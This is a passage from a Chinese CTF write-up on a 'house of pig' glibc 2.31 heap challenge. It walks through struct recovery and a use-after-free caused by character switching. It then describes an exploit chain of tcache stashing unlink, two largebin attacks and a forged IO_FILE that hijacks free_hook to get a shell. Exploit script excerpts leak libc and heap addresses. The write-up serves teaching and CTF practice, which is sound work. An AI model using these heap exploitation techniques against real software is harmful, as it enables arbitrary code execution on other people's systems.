
[![R31GIH.png](https://bbs.kanxue.com/upload/attach/202106/865862_EH62E4HXR4948FN.jpg)](https://bbs.kanxue.com/elink@1ddK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9x3K6q4s2d9f1R3`.)

`tmp_house`结构体中还需要记录能够view的次数，注意，这里`qword_9070+0x101`，并不是说在偏移为`0x101`的位置处，还需要看到前面是`int`类型的指针，是四字节，所以实际上应该是`0x101*4=0x404`的偏移，上面的`current_size`也是如此。

在`edit`功能中

[![R31DeS.png](https://bbs.kanxue.com/upload/attach/202106/865862_ZJV7SEDKNW5K2SX.jpg)](https://bbs.kanxue.com/elink@abcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9x3K6q4p5k6g2x3`.)

`tmp_house`结构体中还需要记录能够`edit`的次数

因此，`tmp_house`结构体应该如下

```c
struct tmp_house {
    struct house peppa_house;
    int current_peppasize;
    struct house mummy_house;
    int current_mummysize;
    struct house daddy_house;
    int current_daddysize;
    int show_time;
    int edit_time;
};
```

在`ida`中创建结构体，看看我们的推测是否正确

`add`功能

[![R33h9A.png](https://bbs.kanxue.com/upload/attach/202106/865862_AK6BCUAZA7Y4FXH.jpg)](https://bbs.kanxue.com/elink@1c4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9x3K6y4Z5z5f1p5`.)

[![R335ct.png](https://bbs.kanxue.com/upload/attach/202106/865862_2VJFRFA3SGC3KNM.jpg)](https://bbs.kanxue.com/elink@26aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9x3K6x3#2j5%4b7`.)

`edit`功能

[![R33HHS.png](https://bbs.kanxue.com/upload/attach/202106/865862_MRM5S6G8GWMSCVW.jpg)](https://bbs.kanxue.com/elink@233K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9x3K6y4t1d9q4x3`.)

成功

结构体恢复就到此为止了，现在再来分析程序就会舒服很多（贴了好多图，希望师傅们看得清楚些）

## 0x3.漏洞分析

经过了上一阶段的分析，我们已经大致梳理了一遍程序的逻辑，现在来总结一下，并补充上面没有说到的

首先，这个程序有三个角色可以选择，在三个角色之间可以来回切换。在程序的开头会将三个角色各自的结构体的两个标志位都清0，程序运行起来后默认是使用的`peppa`这个角色，每个角色都有增删查改切换这五个功能，在`view`和`edit`功能中会检查第一个标志位`flag`是否为0，为0的情况下才能够进行相关操作；`delete`功能会检查`flag`和`flagg`这两个标志位是否都为0，都为0才会进行`free`，`free`之后将`flag`和`flagg`标志位置1，但并没有清空堆指针，所以这里可能会存在`uaf`；随后是切换角色的流程，假如我们从`peppa`切换到`mummy`

[![R3oJWF.png](https://bbs.kanxue.com/upload/attach/202106/865862_P97ZH7TYT223JE7.jpg)](https://bbs.kanxue.com/elink@77bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9x3$3!0v1g2@1j5`.)

如果`next_character_num != character_num`，就会先将当前的角色的`house`结构体存储到`global_house`中，看到`save_peppa_house`这个函数

[![R3oNQJ.png](https://bbs.kanxue.com/upload/attach/202106/865862_H5CDY4VDGC9C38M.jpg)](https://bbs.kanxue.com/elink@ff3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9x3$3!0z5f1f1Z5`.)

仔细观察，是不是少了些什么？`house`有两个标志位，`flag`和`flagg`，但这里只将`flagg`标志位保存了下来，继续往下看

[![R3owe1.png](https://bbs.kanxue.com/upload/attach/202106/865862_7M6EX9TT784TRH7.jpg)](https://bbs.kanxue.com/elink@5a0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9x3$3!0%4k6e0p5`.)

接着根据`next_character_num`来恢复现场

[![R3osJO.png](https://bbs.kanxue.com/upload/attach/202106/865862_48DDVPS93MBS3WM.jpg)](https://bbs.kanxue.com/elink@a02K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9x3$3!0K6d9V1)9`.)

在`recover_peppahouse`函数中将`global_house`中所有的数据都拷贝到了对应角色的`house`结构体中，而`global_house`中的对应的`flag`标志位是0，也就是说，当我们使用`peppa`这个角色`free`了一个`chunk`之后，`flag=1`，`flagg=1`，且这个`chunk`的指针没有清0，再切换到`mummy`，只会将`flagg`标志位进行存储，我们再切换回`peppa`这个角色，就会将`global_house`中的`flag`标志位赋值给`house`，这样一来`peppa_house`的`flag=0`，`flagg=1`，除了不能再次`delete`，`view`和`edit`功能都可以使用，也就是一个`uaf`漏洞。其他的角色也是一样，来回切换一次可以造成一个`uaf`。

## 0x4.漏洞利用

程序使用`calloc`来申请`chunk`，因此无法使用`tcache attack`，并且申请的`chunk`要大于`0x90`，也无法使用`fastbin attack`(不知是否可以使用`largebin_attack`来攻击`global_max_fast`？)

> `house of pig`本质上是通过 `libc2.31` 下的 `largebin attack`以及 `FILE`结构利用，来配合 `libc2.31` 下的 `tcache stashing unlink attack` 进行组合利用的方法

整体思路如下：

1. 为`tcache_stashing_unlink` plus做好准备，往一个`tcache`链中放入五个`chunk`，再往同样大小的`smallbin`中放入两个`chunk`，
2. 构造出`largebin`，泄露`libc`地址和`heap`地址，进行第一次`largebin attack`，将`free_hook-0x8`的位置写上一个堆地址
3. 进行`tcache_stashing_unlink` ，将`free_hook-0x10`作为一个堆地址链入`tcache`头，但由于使用`calloc`，我们无法申请到这个`chunk`
4. 进行第二次`largebin attack`，将`_io_list_all`覆盖成一个堆地址，我们在这个堆上伪造`IO_FILE`，伪造的`FILE`结构体需要满足要求以调用`malloc`来申请`tcache`中的`chunk`，也就是我们要使`2 * ((fp)->_IO_buf_end - (fp)->_IO_buf_base) + 100`=`free_hook`所在的那个`tcache`链的大小，并且还要修改`vtable`指针，`vtable`原本指向`IO_file_jumps`，将其修改为指向`_IO_str_jumps`，原本应该调用 `IO_file_overflow` 的时候，就会转而调用如下的 `IO_str_overflow`，这样一来就能够进而调用`malloc`申请到`free_hook-0x10`处的空间，而如果`_IO_buf_base`指向的空间有数据的话，还会将其中的数据拷贝到`malloc`申请的`chunk`中，所以我们可以在`IO_buf_base`指向的空间布置好`/bin/sh`和`system`的地址，这样一来就被被`memcpy`到`free_hook-0x10`处，`IO_str_overflow`在最后还会`free`掉`IO_buf_base`指向的`chunk`，这样就会触发`system('/bin/sh')` `getshell`

(我太懒了，就直接拿官方`exp`来讲解了，师傅们包容包容orz)

### 第一部分，为`tcache_stashing_unlink`做准备

```python
Change(2)
for x in xrange(5):
    Add(0x90, 'B'*0x28) # B0~B4
    Del(x) # B0~B4
# 到这里0xa0的tcache中放入了5个chunk
Change(1)
Add(0x150, 'A'*0x68) # A0
for x in xrange(7):
    Add(0x150, 'A'*0x68) # A1~A7
    Del(1+x)
    Del(0)
# 将0x160的chunk放入到unsortedbin
Change(2)
Add(0xb0, 'B'*0x28) # B5 split 0x160 to 0xc0 and 0xa0
# 将0x160的chunk分割为0xc0和0xa0的，unsortedbin还剩下0xa0
Change(1)
Add(0x180, 'A'*0x78) # A8
# 将0xa0的unsortedbin放入smallbin，0xa0的smallbin目前有一个
for x in xrange(7):
    Add(0x180, 'A'*0x78) # A9~A15
    Del(9+x)
    Del(8)
# 将0x190的chunk翻入unsortedbin
Change(2)
Add(0xe0, 'B'*0x38) # B6 split 0x190 to 0xf0 and 0xa0
# 切割unsortedbin，unsortedbin还剩下0xa0
# ----- leak libc_base and heap_base
Change(1)
Add(0x430, 'A'*0x158) # A16
# 将0xa0的unsortedbin放入到smallbin，0xa0的chunk目前有两个
# 至此，tcache_stashing_unlink的准备工作完成一部分
```

[![R8GVNF.png](https://bbs.kanxue.com/upload/attach/202106/865862_YGJH6UJ8XN347S4.jpg)](https://bbs.kanxue.com/elink@61bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5p5N6h3e0V1j5`.)

此时的`bins`如上图

### 第二部分，泄露`libc`地址和`heap`地址

```python
Change(1)
Add(0x430, 'A'*0x158) # A16
Change(2)
Add(0xf0, 'B'*0x48) # B7
# B7作为A16和topchunk的隔离，防止A16被free后和topchunk合并
Change(1)
Del(16)
# free A16，将A16放入unsortedbin
Change(2)
Add(0x440, 'B'*0x158) # B8
# 申请一个比unsortedbin更大的chunk，将unsortedbin放入largebin，则largebin中有一个0x440的chunk
# 由于largebin的bk和fd为libc地址，fd_nextsize和bk_nextsize为堆地址，因此可以通过这个largebin来泄露libc地址和heap地址
Change(1)
# 切换角色，造成uaf
Show(16)
ru('message is: ')
libc_base = uu64(rl()) - 0x1ebfe0
lg('libc_base')
# 利用uaf泄露libc地址
Edit(16, 'A'*0xf+'\n')
Show(16)
ru('message is: '+'A'*0xf+'\n')
heap_base = uu64(rl()) - 0x13940
lg('heap_base')
# 使用edit覆盖fd和bk，泄露出heap地址
```

[![R8YmO1.png](https://bbs.kanxue.com/upload/attach/202106/865862_9RMJFGEZT8AKHPF.jpg)](https://bbs.kanxue.com/elink@531K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5q4W2E0e0K6p5`.)

上图是将`A16` free之后的情况

以及下图是此时的`bins`

[![R8YdTf.png](https://bbs.kanxue.com/upload/attach/202106/865862_BPZJXV7ESATVWWG.jpg)](https://bbs.kanxue.com/elink@ffeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5q4W2V1g2r3j5`.)

### 第三部分，第一次`largebin_attack`将`free_hook-0x8`写为一个堆地址
